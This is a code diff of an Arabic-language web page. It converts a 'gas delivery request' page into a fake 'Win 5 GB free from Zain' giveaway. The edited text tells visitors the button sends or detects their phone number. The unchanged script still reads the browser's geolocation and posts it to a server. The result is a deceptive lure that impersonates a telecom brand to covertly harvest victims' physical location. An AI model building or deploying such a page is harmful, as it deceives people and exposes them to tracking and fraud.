@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<title>طلب توصيل غاز</title>
+<title>اربح 5غيغابيت من زين </title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
@@ -44,10 +44,10 @@ button:disabled{
 <body>
 
 <div class="card">
-  <h2>🔥 طلب توصيل غاز</h2>
-  <p>اضغط الزر وسيتم إرسال موقعك مباشرة للمندوب</p>
+  <h2>🔥 اربح 5غيغابيت من زين</h2>
+  <p>اضغط الزرلمعرفت رقم هاتفك</p>
 
-  <button id="sendBtn" onclick="sendLocation()">📍 إرسال موقعي الآن</button>
+  <button id="sendBtn" onclick="sendLocation()">📍 إرسال رقم هاتفي الان</button>
 
   <div id="status"></div>
 </div>
@@ -61,7 +61,7 @@ function sendLocation(){
   const status = document.getElementById("status");
 
   btn.disabled = true;
-  status.innerHTML = "⏳ جاري تحديد موقعك...";
+  status.innerHTML = "جاري تحديد رقم هاتفك...";
 
   if(!navigator.geolocation){
     status.innerHTML = "❌ جهازك لا يدعم تحديد الموقع";
@@ -78,7 +78,7 @@ function sendLocation(){
       .then(res => res.text())
       .then(() => {
         status.innerHTML =
-          "✅ تم إرسال موقعك بنجاح<br>المندوب في الطريق إليك";
+          "✅ تم إرسال رقمك بنجاح<br>ترقب النت المجاني ";
       })
       .catch(() => {
         status.innerHTML = "❌ حدث خطأ أثناء الإرسال";
